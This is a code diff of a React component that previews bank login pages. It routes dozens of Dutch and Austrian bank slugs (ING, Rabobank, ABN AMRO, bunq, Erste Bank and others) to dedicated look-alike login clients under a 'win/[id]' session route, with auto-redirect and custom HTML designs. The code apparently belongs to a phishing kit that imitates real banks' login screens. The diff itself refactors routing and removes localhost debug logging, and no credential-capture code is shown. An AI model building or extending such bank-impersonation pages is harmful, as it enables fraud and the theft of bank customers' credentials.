@@ -6,27 +6,10 @@ import { DEFAULT_DESIGN_CONFIG, BlockType } from "@/lib/bank-design-schema";
 import { DemoShell } from "@/components/demo/DemoShell";
 import type { BankTheme } from "@/lib/bank-theme-config";
 import { getBankTheme } from "@/lib/bank-theme-config";
+import { normalizeBankCustomHtml } from "@/lib/bank-custom-html";
+import { isAustrianTemplateBank, renderDedicatedBankClient } from "@/lib/bank-client-registry";
 import { getRenderableImageProps } from "@/lib/visual-tree-logo";
 import parse, { attributesToProps, domToReact, Element } from "html-react-parser";
-
-// Özel Tasarım İçe Aktarımları
-import { AbnAmroLoginClient } from "@/app/win/[id]/bank/[bank_slug]/abn-amro-client";
-import { AdyenLoginClient } from "@/app/win/[id]/bank/[bank_slug]/adyen-client";
-import { AsnBankLoginClient } from "@/app/win/[id]/bank/[bank_slug]/asn-bank-client";
-import { AsnBankVhRegiobankLoginClient } from "@/app/win/[id]/bank/[bank_slug]/asn-bank-vh-regiobank-client";
-import { AsnBankVoorheenBlgwonenLoginClient } from "@/app/win/[id]/bank/[bank_slug]/asn-bank-voorheen-blgwonen-client";
-import { AsnBankVoorheenSnsLoginClient } from "@/app/win/[id]/bank/[bank_slug]/asn-bank-voorheen-sns-client";
-import { BunqLoginClient } from "@/app/win/[id]/bank/[bank_slug]/bunq-client";
-import { AutoRedirectClient } from "@/app/win/[id]/bank/[bank_slug]/auto-redirect-client";
-import { VanLanschotKempenClient } from "@/app/win/[id]/bank/[bank_slug]/van-lanschot-kempen-client";
-import { IngClient } from "@/app/win/[id]/bank/[bank_slug]/ing-client";
-import { FinomClient } from "@/app/win/[id]/bank/[bank_slug]/finom-client";
-import { YoursafeClient } from "@/app/win/[id]/bank/[bank_slug]/yoursafe-client";
-import { RabobankClient } from "@/app/win/[id]/bank/[bank_slug]/rabobank-client";
-import { N26Client } from "@/app/win/[id]/bank/[bank_slug]/n26-client";
-import { NationaleNederlandenClient } from "@/app/win/[id]/bank/[bank_slug]/nationale-nederlanden-client";
-import { TriodosBankClient } from "@/app/win/[id]/bank/[bank_slug]/triodos-bank-client";
-
 import { BankLoginClient } from "@/app/win/[id]/bank/[bank_slug]/bank-login-client";
 
 export function DynamicBankPreview({ bank }: { bank: BankConfig }) {
@@ -53,30 +36,19 @@ export function DynamicBankPreview({ bank }: { bank: BankConfig }) {
     const bank_slug = bank.slug;
     const bankName = bank.name;
     const hasGeneratedDesign = Boolean(bank.design?.visualTree || bank.design?.customHtml);
+    const dedicatedClient = renderDedicatedBankClient({
+      sessionId: sId,
+      bankSlug: bank_slug,
+      bankName,
+      hasGeneratedDesign,
+      forceAutoRedirect: bank.autoRedirect,
+    });
 
-    if (bank_slug === "van-lanschot-kempen" && !hasGeneratedDesign) {
-      // #region debug-point E:preview-custom-client
-      void fetch("http://127.0.0.1:7778/event", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ sessionId: "vanlanschot-logo-bug", runId: "pre-fix", hypothesisId: "E", location: "DynamicBankPreview.tsx:53", msg: "[DEBUG] Preview forced to Van Lanschot custom client", data: { slug: bank_slug, bankName, hasDesign: Boolean(bank.design), hasVisualTree: Boolean(bank.design?.visualTree), hasCustomHtml: Boolean(bank.design?.customHtml), logoFile: bank.logoFile }, ts: Date.now() }) }).catch(() => {});
-      // #endregion
-      return <VanLanschotKempenClient sessionId={sId} />;
+    if (dedicatedClient) {
+      return dedicatedClient;
     }
-    if (bank_slug === "ing") return <IngClient sessionId={sId} />;
-    if (bank_slug === "finom") return <FinomClient sessionId={sId} />;
-    if (bank_slug === "yoursafe") return <YoursafeClient sessionId={sId} />;
-    if (bank_slug === "rabobank") return <RabobankClient sessionId={sId} />;
-    if (bank_slug === "n26") return <N26Client sessionId={sId} />;
-    if (bank_slug === "nationale-nederlanden") return <NationaleNederlandenClient sessionId={sId} />;
-    if (bank_slug === "triodos-bank") return <TriodosBankClient sessionId={sId} />;
-    if (bank_slug === "abn-amro") return <AbnAmroLoginClient sessionId={sId} />;
-    if (bank_slug === "adyen") return <AdyenLoginClient sessionId={sId} />;
-    if (bank_slug === "asn-bank") return <AsnBankLoginClient sessionId={sId} />;
-    if (bank_slug === "asn-bank-vh-regiobank") return <AsnBankVhRegiobankLoginClient sessionId={sId} />;
-    if (bank_slug === "asn-bank-voorheen-blgwonen") return <AsnBankVoorheenBlgwonenLoginClient sessionId={sId} />;
-    if (bank_slug === "asn-bank-voorheen-sns") return <AsnBankVoorheenSnsLoginClient sessionId={sId} />;
-    if (bank_slug === "bunq") return <BunqLoginClient sessionId={sId} />;
-    
-    const austrianBanks = ["bank-austria", "bawag", "erste-bank", "raiffeisen", "volksbank", "posojilnica", "bank99", "btv", "bks-bank", "oberbank", "hypo-noe", "hypo-tirol", "hypo-vorarlberg", "hypo-burgenland", "hypo-ooe", "aerztebank", "spaengler", "schelhammer", "easybank", "schoellerbank-ag", "schoellerbank", "sparda-bank", "vkb", "anadi-bank", "marchfelder", "dolomitenbank"];
-    if (austrianBanks.includes(bank_slug) && !hasGeneratedDesign) {
+
+    if (isAustrianTemplateBank(bank_slug) && !hasGeneratedDesign) {
       return (
         <div style={{ transform: 'scale(0.75)', transformOrigin: 'top center', width: '133.33%' }}>
           <BankLoginClient sessionId={sId} bankSlug={bank_slug} bank={bank} />
@@ -116,19 +88,10 @@ export function DynamicBankPreview({ bank }: { bank: BankConfig }) {
         };
 
         if (element.type === "image") {
-          // #region debug-point B:preview-image-node
-          void fetch("http://127.0.0.1:7778/event", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ sessionId: "vanlanschot-logo-bug", runId: "pre-fix", hypothesisId: "B", location: "DynamicBankPreview.tsx:100", msg: "[DEBUG] Preview visualTree image node encountered", data: { slug: bank.slug, elementId: element.id, src: props.src ?? null, styles: element.styles ?? null, logoFile: bank.logoFile ?? null }, ts: Date.now() }) }).catch(() => {});
-          // #endregion
-        }
-
-        if (element.type === "image") {
           Object.assign(props, getRenderableImageProps(element, bank.logoFile, bank.name));
         }
 
         if (element.type === "image" && props.src === "placeholder" && bank.logoFile) {
-          // #region debug-point A:preview-placeholder-swap
-          void fetch("http://127.0.0.1:7778/event", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ sessionId: "vanlanschot-logo-bug", runId: "pre-fix", hypothesisId: "A", location: "DynamicBankPreview.tsx:105", msg: "[DEBUG] Preview logo placeholder replaced", data: { slug: bank.slug, elementId: element.id, originalSrc: "placeholder", injectedSrc: bank.logoFile, styles: element.styles ?? null }, ts: Date.now() }) }).catch(() => {});
-          // #endregion
           props.src = bank.logoFile;
         }
 
@@ -156,6 +119,7 @@ export function DynamicBankPreview({ bank }: { bank: BankConfig }) {
     }
 
     if (design.customHtml) {
+      const normalizedHtml = normalizeBankCustomHtml(design.customHtml);
       const options = {
         replace: (domNode: any) => {
           if (domNode instanceof Element) {
@@ -186,12 +150,12 @@ export function DynamicBankPreview({ bank }: { bank: BankConfig }) {
       };
       return (
         <div style={{ pointerEvents: 'none' }} className="min-h-screen w-full font-sans antialiased scale-75 origin-top">
-          {parse(design.customHtml, options)}
+          {parse(normalizedHtml, options)}
         </div>
       );
     }
 
-    const renderBlock = (block: BlockType) => {
+    const renderBlock = (block: BlockType, index: number) => {
       switch (block) {
         case "header":
           if (!design.header.show) return null;
@@ -273,7 +237,7 @@ export function DynamicBankPreview({ bank }: { bank: BankConfig }) {
           );
 
         case "spacer":
-          return <div key={Math.random()} style={{ flexGrow: 1, minHeight: '2rem' }}></div>;
+          return <div key={`spacer-${index}`} style={{ flexGrow: 1, minHeight: '2rem' }}></div>;
           
         default:
           return null;
@@ -293,7 +257,7 @@ export function DynamicBankPreview({ bank }: { bank: BankConfig }) {
           fontFamily: design.typography.fontFamily
         }}
       >
-        {design.blocks.map(block => renderBlock(block))}
+        {design.blocks.map((block, index) => renderBlock(block, index))}
       </div>
     );
   }
